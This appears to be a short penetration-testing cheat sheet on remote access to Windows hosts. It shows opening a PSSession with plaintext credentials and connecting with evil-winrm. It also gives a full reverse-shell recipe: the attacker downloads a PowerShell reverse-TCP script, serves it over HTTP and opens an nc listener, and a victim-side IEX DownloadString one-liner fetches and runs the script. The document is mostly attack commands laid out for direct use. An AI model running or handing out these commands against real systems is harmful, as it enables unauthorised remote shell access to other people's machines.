### Create PSSession

```powershell
$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("USER", $password)
Enter-PSSession -ComputerName $TARGET -Credential $cred
```

#### evil-winrm is better

```shell
evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD
```

###  cmd.exe to powershell.exe

On attacker machine:

```shell
wget https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/invoke_expression/original/powershell_reverse_tcp.ps1
# Change IP and PORT in script
python3 -m http.server # Run HTTP server or whatever 
rlwrap nc -lnvp $PORT #Run listener in other shell
```

On victim machine:

```shell
powershell IEX (New-Object Net.WebClient).DownloadString('http://$TARGET:$PORT/revshell.ps1')
```

![](Windows/Images/CmdToPowershell.png)

```powershell
set PATH=%PATH%;C:\xampp\php # Set path
```